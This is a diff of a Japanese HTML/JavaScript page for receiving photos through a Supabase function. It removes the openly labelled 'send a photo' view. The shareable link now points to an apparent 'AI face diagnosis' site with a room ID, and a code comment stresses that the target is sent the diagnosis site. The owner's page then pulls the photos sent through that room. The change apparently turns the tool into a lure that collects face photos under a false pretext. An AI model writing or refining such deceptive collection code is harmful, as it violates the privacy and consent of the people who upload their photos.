@@ -3,33 +3,57 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>写真受信センター</title>
+
+<title>写真受信ボックス</title>
 
 <style>
+
+* {
+  box-sizing: border-box;
+}
+
 body {
   margin: 0;
-  font-family: sans-serif;
-  background: linear-gradient(135deg, #171329, #35205f);
-  color: white;
+  font-family:
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    sans-serif;
+
+  background:
+    linear-gradient(
+      135deg,
+      #667eea,
+      #764ba2
+    );
+
   min-height: 100vh;
+  padding: 30px 15px;
+  color: #222;
 }
 
 .container {
-  max-width: 500px;
+  max-width: 600px;
   margin: auto;
-  padding: 30px 20px;
 }
 
 .card {
   background: white;
-  color: #222;
-  border-radius: 24px;
+  border-radius: 20px;
   padding: 25px;
+  box-shadow:
+    0 10px 30px rgba(0,0,0,0.2);
+
   margin-bottom: 20px;
 }
 
 h1 {
   text-align: center;
+  margin-top: 0;
+}
+
+h2 {
+  margin-top: 0;
 }
 
 button {
@@ -37,35 +61,75 @@ button {
   padding: 15px;
   border: none;
   border-radius: 12px;
-  background: #6d28d9;
+  background: #667eea;
   color: white;
   font-size: 16px;
   font-weight: bold;
+  cursor: pointer;
   margin-top: 10px;
 }
 
-.linkBox {
-  background: #f3f4f6;
+button:hover {
+  opacity: 0.9;
+}
+
+button:disabled {
+  opacity: 0.5;
+}
+
+input {
+  width: 100%;
   padding: 12px;
+  border: 1px solid #ccc;
   border-radius: 10px;
+  font-size: 16px;
+}
+
+.linkBox {
+  margin-top: 20px;
+  padding: 15px;
+  background: #f3f3f3;
+  border-radius: 12px;
   word-break: break-all;
-  margin-top: 15px;
 }
 
 .photo {
   width: 100%;
-  border-radius: 15px;
+  border-radius: 12px;
   margin-top: 15px;
 }
 
-.hidden {
-  display: none;
+.photoItem {
+  margin-bottom: 25px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid #ddd;
 }
 
 .small {
   color: #666;
   font-size: 13px;
 }
+
+.hidden {
+  display: none;
+}
+
+.success {
+  background: #e8f5e9;
+  color: #2e7d32;
+  padding: 12px;
+  border-radius: 10px;
+  margin-top: 15px;
+}
+
+.error {
+  background: #ffebee;
+  color: #c62828;
+  padding: 12px;
+  border-radius: 10px;
+  margin-top: 15px;
+}
+
 </style>
 </head>
 
@@ -73,325 +137,502 @@ button {
 
 <div class="container">
 
-  <div class="card" id="manager">
+  <div class="card">
 
-    <h1>📷 写真受信センター</h1>
+    <h1>📸 写真受信ボックス</h1>
 
     <p>
-      専用リンクを作成して、そのリンクから送られた写真を受け取れます。
+      ランダムなリンクを作成して、
+      そのリンクから送信された写真を確認できます。
     </p>
 
-    <button id="createLink">
+    <button id="createLinkButton">
       🔗 リンクを作成
     </button>
 
-    <div id="createdArea" class="hidden">
+    <div id="linkArea" class="hidden">
 
-      <p>あなたの専用リンク：</p>
+      <h2>🔗 作成したリンク</h2>
 
-      <div class="linkBox" id="linkText"></div>
+      <div class="linkBox">
+        <div id="generatedLink"></div>
+      </div>
 
-      <button id="copyLink">
+      <button id="copyButton">
         📋 リンクをコピー
       </button>
+
+      <button id="openLinkButton">
+        🌐 AI診断サイトを開く
+      </button>
+
+      <div id="successMessage" class="success hidden">
+        リンクを作成しました！
+      </div>
 
     </div>
 
   </div>
+
 
   <div class="card">
 
     <h2>📥 受信した写真</h2>
 
     <p class="small">
-      専用リンクから送信された写真がここに表示されます。
+      作成したリンクから送信された写真を確認できます。
     </p>
 
-    <button id="refresh">
+    <button id="refreshButton">
       🔄 写真を確認
     </button>
 
-    <div id="photos"></div>
-
-  </div>
-
-  <div class="card hidden" id="sender">
-
-    <h1>📸 写真送信</h1>
-
-    <p>
-      このリンクは写真送信用です。
-    </p>
-
-    <input
-      type="file"
-      id="photoInput"
-      accept="image/*"
-      capture="user"
-      style="width:100%;margin-top:15px;"
-    >
-
-    <button id="sendPhoto">
-      📤 写真を送信
-    </button>
-
-    <p id="status"></p>
+    <div id="photoArea">
+      <p class="small">
+        まだ写真を取得していません。
+      </p>
+    </div>
 
   </div>
 
 </div>
 
+
 <script>
 
-// ★今回作った新しいFunction
-const SUPABASE_FUNCTION =
-"https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
+/*
+  Supabase Edge Function
+*/
 
-const params =
-new URLSearchParams(location.search);
+const SUPABASE_FUNCTION =
+  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";
+
+
+/*
+  元のAI診断サイト
+*/
+
+const AI_DIAGNOSIS_SITE =
+  "https://gaffney16445.github.io/ai-face-diagnosis/";
+
+
+/*
+  HTML要素
+*/
+
+const createLinkButton =
+  document.getElementById(
+    "createLinkButton"
+  );
+
+const linkArea =
+  document.getElementById(
+    "linkArea"
+  );
+
+const generatedLink =
+  document.getElementById(
+    "generatedLink"
+  );
+
+const copyButton =
+  document.getElementById(
+    "copyButton"
+  );
+
+const openLinkButton =
+  document.getElementById(
+    "openLinkButton"
+  );
+
+const successMessage =
+  document.getElementById(
+    "successMessage"
+  );
+
+const refreshButton =
+  document.getElementById(
+    "refreshButton"
+  );
+
+const photoArea =
+  document.getElementById(
+    "photoArea"
+  );
+
+
+/*
+  現在のルームID
+*/
 
 let room =
-params.get("room");
+  new URLSearchParams(
+    window.location.search
+  ).get("room");
+
+
+/*
+  URLにルームIDがなければ
+  保存していたルームIDを使用
+*/
+
+if (!room) {
+
+  room =
+    localStorage.getItem(
+      "receiverRoom"
+    );
+
+}
+
+
+/*
+  ランダムなルームIDを作る
+*/
 
 function makeRoomId() {
 
-  const chars =
-  "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+  const characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
   let result = "";
 
-  for (let i = 0; i < 12; i++) {
+  for (
+    let i = 0;
+    i < 12;
+    i++
+  ) {
+
     result +=
-      chars[Math.floor(Math.random() * chars.length)];
+      characters[
+        Math.floor(
+          Math.random() *
+          characters.length
+        )
+      ];
+
   }
 
   return result;
-}
-
-
-// ============================
-// 管理画面
-// ============================
-
-const manager =
-document.getElementById("manager");
-
-const sender =
-document.getElementById("sender");
-
-
-// room付きURLなら送信画面
-if (room) {
-
-  manager.classList.add("hidden");
-  sender.classList.remove("hidden");
 
 }
 
 
-// ============================
-// リンク作成
-// ============================
+/*
+  リンク作成
+*/
 
-document
-.getElementById("createLink")
-.addEventListener("click", () => {
+createLinkButton.addEventListener(
+  "click",
+  () => {
 
-  room = makeRoomId();
-
-  const link =
-    location.origin +
-    location.pathname +
-    "?room=" +
-    room;
-
-  document
-    .getElementById("createdArea")
-    .classList.remove("hidden");
-
-  document
-    .getElementById("linkText")
-    .textContent = link;
-
-});
+    room =
+      makeRoomId();
 
 
-// ============================
-// リンクコピー
-// ============================
+    /*
+      自分のブラウザに保存
+    */
 
-document
-.getElementById("copyLink")
-.addEventListener("click", async () => {
-
-  const link =
-    document
-      .getElementById("linkText")
-      .textContent;
-
-  try {
-
-    await navigator.clipboard.writeText(link);
-
-    alert("リンクをコピーしました！");
-
-  } catch {
-
-    alert(
-      "コピーできませんでした。リンクを長押ししてコピーしてください。"
+    localStorage.setItem(
+      "receiverRoom",
+      room
     );
 
-  }
 
-});
+    /*
+      ここが重要！
 
+      相手に送るのは
+      元のAI診断サイト
+    */
 
-// ============================
-// 写真送信
-// ============================
-
-document
-.getElementById("sendPhoto")
-.addEventListener("click", async () => {
-
-  const input =
-    document.getElementById("photoInput");
-
-  const status =
-    document.getElementById("status");
-
-  if (!input.files.length) {
-
-    alert("写真を選択してください。");
-
-    return;
-
-  }
-
-  const file =
-    input.files[0];
-
-  status.textContent =
-    "写真を送信しています…";
-
-  try {
-
-    const response =
-      await fetch(
-        SUPABASE_FUNCTION +
-        "?room=" +
-        encodeURIComponent(room),
-        {
-          method: "POST",
-          headers: {
-            "Content-Type":
-              file.type
-          },
-          body: file
-        }
+    const link =
+      AI_DIAGNOSIS_SITE +
+      "?room=" +
+      encodeURIComponent(
+        room
       );
 
-    if (!response.ok) {
 
-      throw new Error(
-        await response.text()
+    generatedLink.textContent =
+      link;
+
+
+    /*
+      ボタンから開けるように保存
+    */
+
+    openLinkButton.dataset.link =
+      link;
+
+
+    linkArea.classList.remove(
+      "hidden"
+    );
+
+    successMessage.classList.remove(
+      "hidden"
+    );
+
+    /*
+      新しいルームなので
+      写真表示をリセット
+    */
+
+    photoArea.innerHTML =
+      "<p class='small'>まだ写真を取得していません。</p>";
+
+  }
+);
+
+
+/*
+  リンクコピー
+*/
+
+copyButton.addEventListener(
+  "click",
+  async () => {
+
+    const link =
+      generatedLink.textContent;
+
+    if (!link) {
+      return;
+    }
+
+    try {
+
+      await navigator.clipboard.writeText(
+        link
+      );
+
+      copyButton.textContent =
+        "✅ コピーしました！";
+
+      setTimeout(
+        () => {
+
+          copyButton.textContent =
+            "📋 リンクをコピー";
+
+        },
+        2000
+      );
+
+    } catch (error) {
+
+      alert(
+        "コピーできませんでした。リンクを長押ししてコピーしてください。"
       );
 
     }
 
-    status.textContent =
-      "✅ 写真を送信しました！";
-
-    input.value = "";
-
-  } catch (error) {
-
-    console.error(error);
-
-    status.textContent =
-      "❌ 写真の送信に失敗しました。";
-
   }
+);
 
-});
 
+/*
+  AI診断サイトを開く
+*/
 
-// ============================
-// 写真確認
-// ============================
+openLinkButton.addEventListener(
+  "click",
+  () => {
 
-document
-.getElementById("refresh")
-.addEventListener("click", async () => {
+    const link =
+      openLinkButton.dataset.link;
 
-  if (!room) {
+    if (!link) {
+      return;
+    }
 
-    alert(
-      "まず専用リンクを作成してください。"
+    window.open(
+      link,
+      "_blank"
     );
 
-    return;
-
   }
+);
 
-  const photos =
-    document.getElementById("photos");
 
-  photos.innerHTML =
-    "読み込み中…";
+/*
+  写真取得
+*/
 
-  try {
+refreshButton.addEventListener(
+  "click",
+  async () => {
 
-    const response =
-      await fetch(
-        SUPABASE_FUNCTION +
-        "?room=" +
-        encodeURIComponent(room)
+    if (!room) {
+
+      alert(
+        "まだリンクを作成していません。"
       );
-
-    const data =
-      await response.json();
-
-    if (
-      !data.success ||
-      !data.photos ||
-      !data.photos.length
-    ) {
-
-      photos.innerHTML =
-        "<p>まだ写真は届いていません。</p>";
 
       return;
 
     }
 
-    photos.innerHTML = "";
 
-    data.photos.forEach(photo => {
+    refreshButton.disabled =
+      true;
 
-      const img =
-        document.createElement("img");
+    refreshButton.textContent =
+      "📥 読み込み中...";
 
-      img.src = photo.url;
 
-      img.className = "photo";
+    try {
 
-      img.alt = "受信した写真";
+      const response =
+        await fetch(
+          SUPABASE_FUNCTION +
+          "?room=" +
+          encodeURIComponent(
+            room
+          )
+        );
 
-      photos.appendChild(img);
 
-    });
+      if (!response.ok) {
 
-  } catch (error) {
+        throw new Error(
+          "取得失敗"
+        );
 
-    console.error(error);
+      }
 
-    photos.innerHTML =
-      "<p>写真を取得できませんでした。</p>";
+
+      const data =
+        await response.json();
+
+
+      photoArea.innerHTML =
+        "";
+
+
+      if (
+        !data.photos ||
+        data.photos.length === 0
+      ) {
+
+        photoArea.innerHTML =
+          "<p class='small'>まだ写真は届いていません。</p>";
+
+        return;
+
+      }
+
+
+      /*
+        写真を表示
+      */
+
+      data.photos.forEach(
+        (photo, index) => {
+
+          const item =
+            document.createElement(
+              "div"
+            );
+
+          item.className =
+            "photoItem";
+
+
+          const title =
+            document.createElement(
+              "p"
+            );
+
+          title.textContent =
+            "📷 写真 " +
+            (index + 1);
+
+
+          const image =
+            document.createElement(
+              "img"
+            );
+
+          image.className =
+            "photo";
+
+          image.src =
+            photo.url;
+
+          image.alt =
+            "受信した写真";
+
+
+          item.appendChild(
+            title
+          );
+
+          item.appendChild(
+            image
+          );
+
+
+          photoArea.appendChild(
+            item
+          );
+
+        }
+      );
+
+    } catch (error) {
+
+      console.error(
+        error
+      );
+
+      photoArea.innerHTML =
+        "<div class='error'>写真を取得できませんでした。</div>";
+
+    } finally {
+
+      refreshButton.disabled =
+        false;
+
+      refreshButton.textContent =
+        "🔄 写真を確認";
+
+    }
 
   }
+);
 
-});
+
+/*
+  すでにルームが保存されている場合
+  自動的にリンクを表示
+*/
+
+if (room) {
+
+  const link =
+    AI_DIAGNOSIS_SITE +
+    "?room=" +
+    encodeURIComponent(
+      room
+    );
+
+
+  generatedLink.textContent =
+    link;
+
+
+  openLinkButton.dataset.link =
+    link;
+
+
+  linkArea.classList.remove(
+    "hidden"
+  );
+
+}
 
 </script>
 
